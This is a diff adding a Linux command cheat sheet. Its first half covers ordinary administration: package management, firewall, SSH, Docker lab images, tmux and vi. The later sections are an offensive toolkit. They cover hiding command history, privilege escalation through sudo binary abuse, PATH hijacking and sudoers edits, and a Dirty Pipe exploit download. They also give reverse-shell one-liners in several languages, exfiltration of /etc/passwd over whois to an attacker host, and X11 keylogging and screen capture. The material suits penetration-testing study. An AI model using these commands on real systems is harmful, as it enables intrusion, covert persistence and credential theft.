@@ -1,0 +1,930 @@
+Linux
+
+
+# This first section is for CentOS
+
+cat /etc/redhat-release                         Show OS version
+
+yum -y install $(cat file)                      Install packages listed in a file
+yum list installed                              Show installed packages
+yum update                                      Refresh package database and install updates
+
+firewall-cmd --state                            Show firewall state
+firewall-cmd --list-all                         Show firewall rules
+firewall-cmd --add-port 8080/tcp --permanent    Add a new incoming firewall rule
+firewall-cmd --reload                           Reload firewall rules
+firewall-cmd --list-all                         Verify new firewall rule
+
+/etc/firewalld/zones/public.xml                 Rules are stored here
+
+usermod -aG wheel lee                           Add new user to the wheel "sudo" group
+------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Base64
+
+echo "lee:password123#" | base64                Encode
+echo "bGVlOnBhc3N3b3JkMTIzIwo=" | base64 -d     Decode
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Compile
+
+gcc test.c -o test                              Compile test
+gcc -m32 test.c -o test                         Compile 32-bit code on a 64-bit box
+chmod 755 test                                  Make the file executable
+./test                                          Run the file
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Compression
+
+tar -zcvf test.tar test                         Compress
+gzip test
+zip -9 test.zip test
+zip -r test.zip test/
+
+7z -x test.7z                                   Extract
+bzip2 -d test.bz2
+tar jxf test.tar.bz2
+gunzip test.gz
+tar zxf test.tar.gz
+tar xf test.tar.xz
+tar zxf test.tar
+tar jxf test.tbz
+tar zxf test.tgz
+unzip test.zip
+
+zcat rockyou.txt.gz > rockyou.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Certificates
+
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+
+apt update && apt install -y certbot letsencrypt python3-certbot-apache
+certbot –-apache –d <domain>
+
+- namecheap
+Create 2 DNS records:
+A >  @  > IP of server
+CNAME > www > FQDN
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Copy Files (remotely)
+
+scp file.txt user@<target IP>:/tmp/             Local to remote
+scp -r user@<target IP>:/path/to/share .        Remote to local
+
+- AWS
+scp -i aws2.pem file.txt ec2-user@<target IP>:/tmp/                  Local to remote
+scp -i aws2.pem -r ec2-user@<target IP>:/home/ec2-user/file.txt .    Remote to local
+
+# Append File (remotely)
+
+cat ~/.ssh/id_rsa.pub | ssh user@<target IP> 'cat >> .ssh/authorized_keys'
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Date & Time
+
+timedatectl list-timezones                      List timezones
+timedatectl set-timezone America/Chicago        Set timezone to Central Standard Time
+date +"%a %b %d, %Y - %r %Z"                    Sun Nov 01, 2020 - 04:06:10 PM CST
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Docker
+
+apt install docker.io
+systemctl start docker
+systemctl enable dockers
+docker search web-dvwa                          Search for an image
+docker pull vulnerables/web-dvwa                Install an image
+docker run -p 80:80 vulnerables/web-dvwa        Start the service for a package
+xdg-open localhost &
+
+docker pull szsecurity/mutillidae
+docker run -p 81:80 szsecurity/mutillidae
+xdg-open localhost:81 &
+
+docker pull szsecurity/webgoat
+docker run -p 82:80 szsecurity/webgoat
+xdg-open localhost:82/WebGoats &
+
+docker pull raesene/bwapp
+docker run -d -p 8080:80 raesene/bwapp
+xdg-open localhost:8080 &
+Default creds bee:bug
+
+systemctl disable docker.service                Disable Docker at boot time
+systemctl disable docker.socket
+
+- Fix error
+Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock:
+Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/containers/json: dial unix /var/run/docker.sock: connect: permission denied
+
+chmod 666 /var/run/docker.sock
+
+- Shell
+docker ps -a                                    Show the current container ID
+docker exec -it <ID> sh                         Connect to a container with a shell
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# File Permissions
+
+read     (r)  4
+write    (w)  2
+execute  (e)  1
+
+-rw-r--r-- 1 root root 3116 Feb 20 15:38 /etc/passwd
+type, owner, group, world, # of hard links, user, group, file size, date, time, file
+Type: file (-), directory (d), link (l)
+
+chmod 755 test.sh                               Make a file executable
+
+chown <user>:<group> <file/directory>
+chown kali:kali test.sh                         Change owner permissions
+chown -R kali:kali data                         Change owner permissions recursively
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# File Transfer
+
+python3 -m http.server                          Starts a web sever on the default port 8000
+python3 -m http.server 80                       Starts a web sever on port 80
+
+curl                                            Supports more protocols and APIs
+curl -ikL 10.0.0.5/test.txt -O                  Download a file
+curl -ikL 10.0.0.5/test.txt -o results.txt      Download a file and rename it
+
+wget                                            No APIs, supports recursive download
+wget 10.0.0.5/test.txt                          Download a file
+wget 10.0.0.5/test.txt -O results.txt           Download a file and rename it
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Files & Directories
+
+ls                                              List files in a directory
+ls -l                                           Long form listing
+ls -la                                          Long form listing with hidden files
+
+cd ~                                            Change to the home directory
+cd test                                         Change to the test directory
+pwd                                             Print the current working directory
+
+touch tmp                                       Create a file
+mkdir -p tmp                                    Create a directory
+mkdir -p tmp/{red,white,blue}                   Create a directory with 3 sub directories
+
+cat tmp                                         Show the contents of a file
+more tmp                                        Show the contents of a file, a page at a time
+                                                Space bar for the next page or 'q' to quit
+
+cp tmp tmp2                                     Copy a file from one location to another
+cp -r dir dir2                                  Copy a directory from one location to another
+mv tmp tmp2                                     Rename or move tmp to tmp2
+rm tmp                                          Delete a file
+rm -rf test                                     Force delete the directory
+
+ln -s /path/to/file /path/to/link               Create a symbolic link
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# File Descriptors
+
+STDIN – 0                                       Data stream for input
+STDOUT – 1                                      Data stream for output
+STDERR – 2                                      Data stream for output that relates to an error occurring
+
+find /etc/ -name shadow 2>/dev/null > tmp       Redirect STDOUT to a new file
+find /etc/ -name shadow 2> stderr.txt 1 > tmp   Redirect STDERR and STDOUT to separate new files
+
+ping targat.com > tmp                           Redirect STDOUT to a new file
+ping target2.com >> tmp                         Redirect STDOUT and append to a file
+wc -m < tmp                                     Redirect STDIN
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# File Integrity
+
+md5sum test.iso                                 MD5 hash
+sha1sum test.iso                                SHA1 hash
+sha256sum test.iso                              SHA256 hash
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Finding Files
+
+which <file>                                    Path where a file is executed from
+
+- find                                          Contains many filters
+find / -type f -name pass* -user root 2>/dev/null        Find files that start with pass and owned by root
+find / -type f -name *.conf -size +100k 2>/dev/null      Find config files that are larger than 100 kb
+find / -type f -newermt 2020-03-03 2>/dev/null           Find files newer than 2020-03-03
+find / -type f -size -28k -size +25k 2>/dev/null         Find files less than 28kb and greater than 25 kb
+find / -type f -perm 0777 -print -exec chmod 644 {} \;   Find files with permission 777 and change to 644
+
+- locate                                        Contains no filters
+updatedb                                        Updates the local database of all file and folder locations
+locate <file>                                   Searches a local database (locate.db) that contains information about existing files and folders
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Firewall
+
+sudo ufw status numbered
+sudo ufw enable/disable
+sudo ufw allow 22/tcp                           Allow all SSH traffic
+sudo ufw allow from <IP/CIDR> to any port 22 proto tcp comment 'Lee'
+sudo ufw delete <#>                             Delete a specific line number
+sudo ufw reload                                 Run after any changes are made
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Installation
+
+./configure                                     Install from source
+make
+make install
+
+dpkg -i app.deb                                 Install Debian package
+dpkg --list | grep 'ii' | wc -l                 Total number of packages installed
+
+rpm -vhU app.rpm                                Install RPM package
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Networking
+
+dhclient                                        Request an IP address from the DHCP server
+/var/lib/dhcp/dhclient.leases                   DHCP
+route                                           Gateway
+/etc/hostname                                   Hostname
+/etc/network/interfaces                         Network interfaces
+
+/etc/resolv.conf                                DNS
+# Generated by NetworkManager
+search localdomain
+nameserver 172.16.219.2
+
+route
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         172.16.219.2    0.0.0.0         UG    100    0        0 eth0
+172.16.219.0    0.0.0.0         255.255.255.0   U     100    0        0 eth0
+
+ifconfig                                        IP addresses to all network interfaces
+ifconfig eth0 down                              Bring interface down
+ifconfig eth0 up                                Bring interface up
+ifconfig eth0 <IP> netmask <mask>               Set IP and netmask
+route add default gw <IP> eth0                  Set default gateway
+
+- Static IP address
+route                                           Note the gateway IP address
+
+/etc/network/interfaces
+auto eth0
+iface eth0 inet static
+    address 192.168.1.5/24
+    gateway 192.168.1.x                         Use the gateway IP from the route command above
+
+systemctl restart networking.service            Restart networking
+
+curl -ikL ifconfig.me                           Show external IP
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Processes
+
+ps faux                                         Show running processes
+ps -ef | grep ssh                               Show ssh processs
+ps -ef | grep root                              Processes running as root
+ps -ef | grep -v root                           Processes running under another account besides root
+jobs                                            Show background processes
+top                                             Running processes, CPU, and memory
+kill -9 <PID>                                   Kill process ID
+killall <service>                               Kill all processes named service
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Proxy
+
+git config --global http.proxy http://proxy:port
+
+Add to bottom of $HOME/.bashrc
+export http_proxy=http://username:password@proxy:port
+export https_proxy=https://username:password@proxy:port
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Python
+
+pip3 install -r requirements.txt                Install required Python packages
+apt install python3-<package>                   Install a particular Python package
+apt upgrade python3-<package>                   Upgrade a particular Python package
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Redirecting
+
+screen -S test
+socat TCP4-LISTEN:443,fork TCP4:<remote IP>:443
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Remote Desktop
+
+rdesktop -u <username> -p <password> -g 75% 10.0.0.10
+
+If Network Level Authentication is enabled:
+xfreerdp /u:user /p:password /d:domain /v:10.0.0.10 /port:3389 /size:75%h /drive:share,/tmp /clipboard
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Reset a forgotten password
+
+Reboot your box and press 'e' at the GRUB menu to edit the boot options.
+Look for the line that starts with 'linux' and replace 'ro quiet splash' with 'rw init=/bin/bash'.
+ctrl x                       Reboot with changes.
+You may need to hit return or 'ls' to see the root shell.
+
+mount -o remount,rw /        Mount the filesystem and make it editable
+cat /etc/passwd              Show user accounts
+passwd <user>                Set a new password
+exec /sbin/init              Reboot
+
+Login as <user> with the new password.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Screen
+
+Allows session sharing where tmux does not.
+
+screen -ls                                      List sessions
+screen -S test                                  Start a new session named test
+screen -dmS test                                Start a new session in detached mode named test
+
+ctrl+a d                                        Detach from the current session
+screen -r                                       Attach to the current session
+screen -r <PID or name>                         Attach to a specific session
+screen -x test                                  Attach to a session called 'test'
+User 2: screen -x test                          A second user attaches to the same session, now both users can see the same screen
+
+screen -X -S <PID or name> quit                 Kill a specific session
+exit                                            Exit the session
+
+ctrl+a "                                        List windows
+ctrl+a c                                        Create a new window
+ctrl+a 2                                        Switch to window 2 (by number)
+ctrl+a n                                        Switch to the next window
+ctrl+a p                                        Switch to the previous window
+
+ctrl+a |                                        Split current region horizontally
+ctrl+a S                                        Split current region vertically
+ctrl+a tab                                      Switch to the next region
+
+ctrl+a shift+q                                  Close all regions but the current one
+ctrl+a shift+x                                  Close the current region
+
+ctrl+a esc                                      Use the up and down arrows or mouse to scroll
+esc                                             Exit scrollback mode
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Services
+
+systemctl <start/stop/restart/status> <service>
+systemctl enable <service>                      Enable a service at boot time
+systemctl disable <service>                     Disable a service at boot time
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# SMB
+
+cd /etc/samba/
+mv smb.conf smb.conf-old
+vi smb.conf
+[tools]
+   comment = Testing SMB sharing
+   path = /home/lee/share/
+   browseable = yes
+   read only = no
+   guest ok = no
+
+mkdir -p /home/lee/share/                       Create new directory to share
+chmod -R 777 /home/lee/share                    Give Everyone access
+service smbd start                              Start the SMB service
+service nmbd start
+service smbd status                             Check the status of the service
+smbpasswd -a lee                                Add a user and set the password for the share
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+# SSH
+
+It uses public-key cryptography to verify the remote host's identity. Based on the client-server architecture.
+Symmetric encryption methods and hashing algorithms.
+
+ssh-keygen                                      Create new keys
+ssh-copy-id user@host                           Copy the public key to a server's authorized_keys file
+
+- Configure a non-standard port
+vi  /etc/ssh/sshd_config
+#Port 22                                        Uncomment and change the port number
+
+- Service
+systemctl start ssh                             Start ssh service
+systemctl enable ssh                            Enable ssh at boot time
+
+- Permissions
+-rw-------  authorized_keys
+-rw-------  aws.pem
+-rw-------  config
+-rw-------  id_rsa
+-rw-r--r--  id_rsa.pub
+-rw-r--r--  known_hosts
+
+ssh user@host                                   Standard connection
+ssh user@host -p 2222                           Connect on a non-standard port
+ssh user@host -i <key>                          Connect using an identity file
+
+- Local port forwarding
+ssh <gateway> -L <local port>:<remote host>:<remote port>
+ssh user@host -L 5900:localhost:5900
+
+- Remote port forwarding
+ssh <gateway> -R <local host>:<local port>:<remote host>:<remote port>
+ssh user@host -R 0.0.0.0:22:127.0.0.1:22
+
+Open a new tab in Terminal on the local host
+nc -lvnp 22
+
+- Dynamic port forwarding
+ssh user@host -f -N -D 1080                     -D   Create a SOCKS tunnel
+proxychains nmap <options>
+
+Firefox Preferences > Advanced > Network > Settings > Manual proxy configuration
+Remove everything for HTTP, SSL and FTP proxies and ports
+SOCKS Host: 127.0.0.1   Port: 1080
+Select SOCKS v5 and Remote DNS
+
+- X11
+/etc/ssh/ssh_config                             Edit the SSH config file on the server
+ForwardX11 yes
+/etc/ssh/sshd_config                            Edit the SSH config file on the server
+X11Forwarding yes
+
+systemctl restart sshd                          Restart the SSH service on the server
+exit
+
+ssh -X user@host -o "XAuthLocation=/opt/X11/bin/xauth"
+xdg-open                                        Start a GUI app
+
+Note: if using macOS as the client, install XQuartz.
+
+- Authenticate using a specific key
+ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha256 user@target
+
+- Fix display variable
+echo $DISPLAY                                   Check what the current environmental variable is set to
+export DISPLAY=:0
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# System
+
+cal                                             Calendar
+date                                            Date and time
+df -h                                           Disk usage
+du                                              Directory space usage
+env                                             Environmental variables
+fdisk -l                                        Partition table
+finger <user>                                   Info about a user
+free                                            Memory and swap usage
+halt                                            Power off
+/proc/cpuinfo                                   CPU info
+/proc/meminfo                                   Memory info
+reboot                                          Reboot
+set                                             Environmental variables
+uptime                                          Current uptime
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Terminal
+
+ctrl + alt + t                                  Open a Terminal
+ctrl + shift + t                                Open a new tab in the Terminal
+ctrl + a                                        Move the cursor to the beginning of the line
+ctrl + e                                        Move the cursor to the end of the line
+ctrl + l                                        Clear the screen
+ctrl + c                                        End the current task or process
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# tmux
+
+tmux                                            Start a new session
+tmux new -s <name>                              Start a new session with a specific name
+
+tmux ls                                         List sessions
+tmux a                                          Attach to the previous session
+tmux a -t <name>                                Attach to a specific session name
+ctrl+b %                                        Rename a session
+ctrl+b d                                        Detach from the current session
+exit                                            Exit the current session
+
+ctrl+b w                                        List windows
+ctrl+b c                                        Create a new window
+ctrl+b ,                                        Rename the current window
+ctrl+b x                                        Kill current window
+ctrl+b                                          Select a windows
+ctrl+b ""                                       Split the pane horizontally
+ctrl+b %                                        Split the pane vertically
+ctrl+b arrow key                                Switch between panes
+ctrl+d                                          Close the pane
+
+- Add file to home directory to remap prefix from b to c and other goodies.
+https://github.com/hamvocke/dotfiles/blob/master/tmux/.tmux.conf
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Traffic Capture
+
+tcpdump -lnni eth0 tcp
+tcpdump -lnni eth0 port 22
+tcpdump -lnni eth0 src 10.0.0.10
+tcpdump -lnni eth0 dst 10.0.0.10
+tcpdump -lnni eth0 'udp port 53'
+tcpdump -lnni eth0 'tcp port 443'
+tcpdump -lnni eth0 'dst 10.0.0.10 and dst port 443'
+tcpdump -w out.pcap -s 65535  'udp port 53'
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Tunneling VNC over SSH
+
+OS X (awsv)                                     ssh -i ~/.ssh/aws.pem ec2-user@host -L 5901:localhost:5901
+
+Remote Kali                                     sudo -i
+                                                vncserver -geometry 2560x1600
+
+OS X                                            Applications > VNC Viewer: localhost:5901
+                                                Enter a password twice, then No
+
+Terminate on Remote Kali                        vncserver -kill :1
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# User Accounts
+
+whoami                                          Who are you logged in as
+id                                              User and group ids
+w                                               Users currently logged on
+last                                            Last 10 users logged on
+
+cat /etc/passwd                                 Show user accounts
+cat /etc/shadow                                 Show encrypted passwords
+
+passwd                                          Change the current user's password
+passwd <user>                                   Change another user's password
+
+su                                              Switch to another user
+
+- New user setup
+useradd -m lee                                  Add new user, create home directory, and set default shell
+useradd -m -s /usr/bin/zsh lee                  Add new user, create home directory, and set a different shell
+passwd lee                                      Set a password
+usermod -aG sudo lee                            Add new user to the sudo group.
+su - lee                                        Switch to new user
+ssh-keygen
+cd .ssh/
+vi authorized_keys                              Add your ssh key
+chmod 600 authorized_keys                       Set permissions
+
+userdel <user>                                  Delete user
+userdel -r <user>                               Delete user and user's home directory
+
+cat /etc/group                                  Groups
+groupadd <group>                                Add new group
+groupdel <group>                                Delete group
+groupmod <group>                                Modify group
+
+kali ALL=(ALL) NOPASSWD:ALL                     Add to /etc/sudoers, no password needed for kali to sudo
+
+- Change default shell to zsh
+vi /etc/passwd                                  Locate user acount and change /bin/bash to /bin/zsh
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Video Resolution
+
+xrandr                                          Supported resolutions
+xrandr -s <resolution>                          Set resolution
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# vi
+
+vi oldfile                                      Open an existing file
+vi newfile                                      Create a new file
+
+Modes                                           Command, Insert, Append and Replace
+
+- Command mode
+:set number                                     Turn on line numbers
+:set nonumber                                   Turn off line numbers
+dd                                              Delete the current line
+yy                                              Copy the current line
+p                                               Paste the clipboard contents
+<esc> u                                         Undo
+
+gg                                              Beginning of file
+G                                               End of file
+0                                               Beginning of line
+$                                               End of line
+
+Search
+/                                               Search string
+n                                               Next string
+N                                               Previous string
+
+Search and replace
+:%s/foo/bar/g                                   Search for foo and replace with bar globally
+
+- Insert mode
+Position the cursor where the new text should go.
+i
+Enter new text.
+<esc> to return to command mode.
+
+- Append mode
+Position the cursor on the last letter of the line.
+a
+Enter new text. This adds text AFTER the cursor.
+<esc> to return to command mode.
+
+- Replace mode
+Move the cursor to the character to be replaced.
+r
+Enter the replacement character.
+<esc> to return to command mode.
+
+<esc>                                           Quit
+:q
+<return>
+
+<esc>                                           Force quit
+:q!
+<return>
+
+<esc                                            Write changes
+:w
+<return>
+
+<esc>                                           Write changes and quit
+:wq
+<return>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Situational Awareness
+
+unset HISTFILE                                  Ensure commands are not written to history file
+ps -ef                                          Show active processes
+uname -a                                        Show OS and build info
+last                                            Show previous logins
+w                                               Show current logins
+netstat -antpu                                  Show active network connections
+sudo -s                                         Enter admin session if possible
+ls /home/                                       Show home directories
+ls /home/<username>/.ssh                        Look for SSH keys
+cat /home/<USERNAME>/.bash_history | less       Show a user's command history, use up/down arrows
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Anonymous Mountable CIFS
+
+mkdir -p /mnt/temp/
+mount -t cifs -o username=user,password=password,domain=foo //<target IP>/share /mnt/temp
+
+- OS X
+mount -t cifs -o user=<user>,pass=<password>,nounix,sec=ntlmssp //<target IP>:Users/<user> /mnt/temp/
+
+cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Anonymous Mountable NFS
+
+showmount -e <target IP>
+
+apt install nfs-common
+mkdir -p /mnt/temp/
+mount -t nfs <target IP>:/<share> /mnt/temp/ -o nolock
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Anonymous Mountable SMB
+
+smbclient -L <target IP> -N
+smbclient //<target IP>/<share>
+smb: \> ls
+smb: \> cd <directory>
+smb: \> cd "<long directory>"
+smb: \> get <file>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Privilege Escalation
+
+- /etc/sudoers
+sudo -l                                                    Users that can run specific binaries with root permissions
+
+User www-data may run the following commands on winxp:
+     (root) NOPASSWD: /usr/bin/strace
+
+sudo /usr/bin/strace cp /bin/bash /tmp/foo                 Make a copy of bash
+sudo /usr/bin/strace chmod 4755 /tmp/foo                   Assign a SUID bit
+/tmp/foo -p                                                Run with -p to maintain the SUID privileges
+id                                                         You should now have a uid of 0 (root)
+
+- Groups
+id
+uid=1000(lee) gid=1000(lee) groups=1000(lee),1001(demo)    The user is part of the demo group
+find / -group demo 2>/dev/null                             Search for binaries in that group
+ls -la /usr/bin/demo                                       Check the privileges, look for root
+file /usr/bin/demo                                         Check for the file type, look for setuid
+
+Example: the binary is using the cat command.
+cd /tmp/
+echo "/bin/sh" > cat
+chmod 755 cat                                              Set execute privileges
+export PATH=/tmp:$PATH                                     Add the /tmp directory to the PATH environmental variable
+echo $PATH                                                 Check that the directory has been added
+demo                                                       Execute the binary
+id                                                         You should now have a uid of 0 (root)
+
+- Search for exploits
+searchsploit linux kernel ubuntu 16.04
+
+- Search for passwords and keys
+find / -name "*password*"
+find / -name "id_rsa"
+
+- Check for bad permissions
+find / -perm -4000 2>/dev/null                             Binaries with the SUID bit set - run the file with permissions of its owner
+find / -user root -perm -6000 -print 2>/dev/null           Binaries with the SGID bit set - run the file with permissions of the owner's group
+find / -perm -1000 2>/dev/null                             Binaries with the sticky bit set - only the owner of a directory or a file can delete or rename
+
+find / -perm -o+w -type f 2>/dev/null                      World writable files
+find / -writable -type d 2>/dev/null                       World writable folders
+
+find / -perm -o+x -type f 2>/dev/null                      World executable files
+find / -perm -o+x -type d 2>/dev/null                      World executable folders
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null     World writable & world executable folders
+
+- Enumeration scripts (suggested order)
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
+wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4linux.pl
+wget https://downloads.cisofy.com/lynis/lynis-3.0.4.tar.gz     cd lynis; ./lynis audit system
+
+- Abusing binaries
+sudo apache2 -f /etc/shadow                                A way to view a system file
+sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash -i"
+sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
+sudo apt changelog apt                                     !/bin/sh then hit enter
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo ed                                                    !/bin/sh then hit enter
+sudo env /bin/bash
+sudo find /home -exec /bin/bash \;
+sudo git help add                                          !/bin/sh then hit enter
+touch tmp
+find tmp -exec whoami \;                                   Find a file then execute a command
+find tmp -exec netcat -lvnp 443 -e /bin/sh \;
+
+sudo ftp
+! /bin/bash
+
+sudo less /etc/passwd                                      !/bin/sh then hit enter
+sudo man man                                               !/bin/sh then hit enter
+sudo more /etc/passwd                                      !/bin/sh then hit enter
+echo "os.execute('/bin/bash')" > test.nse && sudo nmap --script=test.nse
+sudo perl -e 'exec "/bin/bash";'
+sudo python -c 'import pty;pty.spawn("/bin/bash")'
+sudo scp /etc/passwd lee@10.0.0.5:~/
+
+socat file:`tty`,raw,echo=0 tcp-listen:443                 Attack VM
+sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<attack IP>:443
+
+sudo vi                                                    :!bash
+sudo vi                                                    !/bin/sh
+sudo vi                                                    :set shell=/bin/bash
+                                                           :shell
+
+- Abusing the PATH variable
+After escaping a restricted shell, export “/bin/bash” as a SHELL environment variable
+and “/usr/bin” as a PATH environment variable so that we can run Linux commands properly.
+export PATH=/bin:/usr/bin:$PATH
+export SHELL=/bin/bash:$SHELL
+
+- Add a user to the sudoers file
+#!/usr/bin/env python
+import os
+import sys
+try:
+    os.system('echo "lee ALL= (root) NOPASSWD: /usr/bin/apach2, /usr/bin/awk, /usr/bin/find" >> /etc/sudoers')
+except:
+    sys.exit()
+
+- Cron jobs
+crontab -l                                                 Check for entries
+ls -l /etc/cron*                                           Scheduled cron jobs
+
+What files are owned by a particular user, but are not present in their home directory?
+What are the files present in the /home/user folder? Are there any hidden files and folders?
+What groups does the user belong to?
+
+- Dirty Pipe (CVE-2022-0847)
+Requires Linux 5.8 or later.
+wget https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c
+gcc dirtypipez.c -o dirtypipez
+find / -perm 4000 2>/dev/null
+./dirtypipez <binary>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Reverse Shells
+
+- Setup a local listener
+nc -lvnp 443			                                  Setup a listen on the attack box
+
+- Bash shell
+bash -i >& /dev/tcp/10.0.0.10/443 0>&1
+
+- Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.10/443;cat <&5 | while read -r LINE; do \$LINE 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+- Netcat Linux
+nc 10.0.0.10 443 -e /bin/sh
+
+- Netcat Windows
+nc 10.0.0.10 443 -e cmd.exe
+
+- Ubuntu does not allow the -e flag
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.10 443 > /tmp/f
+If that doesn't work install ncat.
+ncat 10.0.0.10 443 -e /bin/sh
+
+- Perl
+perl -e 'use Socket;$i="10.0.0.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+- PHP
+<?php exec('nc 10.0.0.10 443 -e /bin/bash') ?>
+
+- Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+- Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+- xterm
+xterm -display 10.0.0.10:1                                 target - it will connect back to you on TCP port 6001
+Xnest :1                                                   attacker - catch the incoming xterm, start an X-Server
+xhost +<target IP>                                         attacker - authorize the target to connect to you
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Rstatd Enabled
+
+rsysinfo <target IP>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Upgrade to a full TTY session
+
+awk                                                        awk 'BEGIN {system("/bin/bash")}'
+find                                                       find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+Lua                                                        os.execute('/bin/sh')
+nmap                                                       !sh
+nmap                                                       --interactive
+Perl                                                       perl —e 'exec "/bin/bash";'
+Perl                                                       exec "/bin/sh";
+Python                                                     python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ruby                                                       exec "/bin/sh"
+sh                                                         /bin/bash
+Within IRB                                                 exec "/bin/sh"
+Within vi                                                  :!bash
+Within vi                                                  :set shell=/bin/bash:shell
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# whois Data Exfil
+
+nc -lvnp 43 | sed "s/ //g" | base64 -d                     Attacker
+whois -h <attacker IP> -p 43 `cat /etc/passwd | base64`    Target
+
+- additional method
+rlogin -l "$(cat /etc/passwd)" -p port <target IP>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# X11 Unauthenticated Access
+
+- Enumeration
+nmap -Pn -n -T4 --open -p6000-6009 <target IP>
+
+- Gather window info
+Port 6001 = display 1
+xwininfo -root -tree -display <target IP:display #>
+
+- Remotely view
+xwatchwin <target IP:display #> -w <ID>
+
+- Capture screenshot
+xwd -root -screen -silent -display <target IP:display #> > 1.xwd
+convert 1.xwd 1.png
+display 1.png
+
+- Keylogger
+xspy -display <target IP:display #>
+If Kali's version does not work, you may need to compile from source https://github.com/mnp/xspy
+
+- Remote Desktop
+xrdp.py <target IP:display #>
+
+- Reverse shell
+xrdp.py <target IP:display #> –no-disp
+It will prompt a new control pane where we can see the R-shell option.
+nc -lvnp 443
+Go back to the window and enter the attackerIP:port, then select R-Shell.
